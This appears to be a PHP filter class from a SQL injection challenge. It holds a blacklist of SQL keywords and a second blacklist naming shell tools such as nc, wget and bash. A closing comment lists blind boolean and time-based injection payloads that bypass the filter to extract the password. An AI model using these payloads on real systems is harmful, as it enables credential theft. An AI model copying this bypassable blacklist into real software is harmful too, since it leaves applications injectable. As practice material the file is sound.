<?php
class fiter{
	var $str;
	var $order;
	
	function sql_clean($str){
		if(is_array($str)){
			echo "<script> alert('not array!!@_@');parent.location.href='index.php'; </script>";exit;
		}
		$filter = "/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";  
		
        //由于在mysql中认为 %a0 也是空格,所以这里也需要过滤, 
		//在这里做了修改,添加 %a0

		if(preg_match($filter,$str)){
			echo "<script> alert('illegal character!!@_@');parent.location.href='index.php'; </script>";exit;
		}else if(strrpos($str,urldecode("%00"))){
			echo "<script> alert('illegal character!!@_@');parent.location.href='index.php'; </script>";exit;
		}
		return $this->str=$str;
	}
	
	function ord_clean($ord){
		$filter = " |bash|perl|nc|java|php|>|>>|wget|ftp|python|sh";
		if (preg_match("/".$filter."/i",$ord) == 1){
			return $this->order = "";
		}
		return $this->order = $ord;
	}

	/*
	bool:
	uname='!=!!ord(mid(passwd)from(-1))>0!=!!'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)%'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)!=!!'1&passwd=dddd
	uname=12'%(ascii(mid(user()from(-1)))=101)^'1&passwd=dddd
	//uname=12'%(ascii(mid(user()from(-1)))=101)&'1&passwd=dddd
	uname='%2b(ascii(mid((passwd)from(-1)))=101)-'1&passwd=dddd
	//uname=12'||(ascii(mid(user()from(-1)))=112)&'1&passwd=dddd
	//uname=12'||(ascii(mid(user()from(-1)))=112)!='1&passwd=dddd
	//uname=12'||(ascii(mid(user()from(-1)))=112)^'1&passwd=dddd
	time:
	uname='!=!!sleep(ascii(mid((passwd)from(-1)))=101)!=!!'1&passwd=dddd
	*/
}
